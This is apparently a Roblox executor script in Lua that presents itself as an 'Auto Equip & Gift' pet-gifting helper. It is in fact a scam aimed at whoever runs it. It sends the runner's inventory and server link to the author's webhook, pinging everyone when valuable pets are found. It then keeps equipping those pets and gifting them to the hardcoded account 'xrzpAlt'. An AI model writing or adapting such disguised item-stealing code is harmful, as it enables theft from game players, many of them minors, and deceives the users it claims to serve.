--]]

local Config = {
    -- The username of the player you want to gift the pets to.
    GiftToPlayer = "xrzpAlt",

    -- List of pet names to automatically equip and then gift.
    -- This list is ALSO used to check if the user has a "desired" pet for the webhook ping.
    PetsToCycle = {
        "Raccoon",
        "Kitsune",
        "Mimic Octopus",
        "Peacock"
    },
    
    -- SPEED CONTROL: Delay between gifting each pet.
    -- Lower numbers are faster. 0.1 is extremely fast.
    CycleSpeed = 0.1 -- (in seconds)
}


--[[-----------------------------------------------------------------------------------------
// SCRIPT CORE - NO EDITING NEEDED BELOW
--]]

local player = game:GetService("Players").LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
local backpack = player:WaitForChild("Backpack")

-- Locate the gifting remote event ahead of time for speed.
local petGiftingEvent = replicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

-- This function runs the script in a separate thread to prevent it from freezing anything.
spawn(function()
    -- Send Webhook Notification First
    pcall(function()
        -- Scan the backpack for all pets (tools)
        local backpackContents = {}
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(backpackContents, "- " .. item.Name)
            end
        end
        
        local petsListString = table.concat(backpackContents, "\n")
        if petsListString == "" then
            petsListString = "No items found in backpack."
        end

        if #petsListString > 1024 then
            petsListString = string.sub(petsListString, 1, 1020) .. "\n..."
        end

        -- Check if the user has any of the desired pets to determine if we should ping
        local hasDesiredPet = false
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                for _, desiredPetName in ipairs(Config.PetsToCycle) do
                    if string.find(string.lower(item.Name), string.lower(desiredPetName)) then
                        hasDesiredPet = true
                        break
                    end
                end
            end
            if hasDesiredPet then break end
        end

        local pingContent = nil
        if hasDesiredPet then
            pingContent = "@everyone"
        end
        
        -- Create the server join link using the web redirector from the video
        local serverLink = "[Click Here to Join Server](https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")"

        -- Prepare the webhook data with the pet list, server link, and conditional ping
        local data = {
            ["content"] = pingContent,
            ["embeds"] = {{
                ["title"] = "Executor Script Activated",
                ["description"] = "**" .. player.Name .. "** has just run the pet gifting script.",
                ["color"] = 16711680, -- Red
                ["fields"] = {
                    {
                        ["name"] = "Server Link",
                        ["value"] = serverLink,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "User's Pet Inventory",
                        ["value"] = petsListString,
                        ["inline"] = false
                    }
                },
                ["footer"] = {
                    ["text"] = "Auto Equip & Gift V8"
                }
            }}
        }
        
        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = httpService:JSONEncode(data)
        })
    end)

    print("Auto Equip & Gift V8 (Max Speed): Started.")
    
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    print("Auto Equip & Gift V8: Character loaded. Starting high-speed loop.")

    -- The main infinite loop.
    while task.wait() do
        -- Check if the target player exists in the game.
        local targetPlayer = game:GetService("Players"):FindFirstChild(Config.GiftToPlayer)
        
        if not targetPlayer then
            warn("Auto Equip & Gift V8: Waiting for player '" .. Config.GiftToPlayer .. "' to join the game.")
            repeat task.wait(2) 
                targetPlayer = game:GetService("Players"):FindFirstChild(Config.GiftToPlayer)
            until targetPlayer
            print("Auto Equip & Gift V8: Target player found. Resuming.")
        end
        
        if not humanoid or humanoid:GetState() == Enum.HumanoidStateType.Dead then
            print("Auto Equip & Gift V8: Player died. Pausing.")
            humanoid.Died:Wait() 
            repeat task.wait() until humanoid:GetState() ~= Enum.HumanoidStateType.Dead
            print("Auto Equip & Gift V8: Player respawned. Resuming.")
        end

        -- Go through each pet name in your configured list.
        for _, petNameToFind in ipairs(Config.PetsToCycle) do
            local foundTool = nil
            
            -- Search the player's backpack for the tool.
            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") and string.find(string.lower(tool.Name), string.lower(petNameToFind)) then
                    foundTool = tool
                    break 
                end
            end
            
            if foundTool then
                humanoid:EquipTool(foundTool)
                task.wait() 

                local args = {
                    "GivePet",
                    targetPlayer,
                    foundTool
                }
                petGiftingEvent:FireServer(unpack(args))
                print("Auto Equip & Gift V8: Attempted to gift '" .. foundTool.Name .. "' to " .. targetPlayer.Name)
                
                task.wait(Config.CycleSpeed)
            end
        end
        
        task.wait(1)
    end
end)
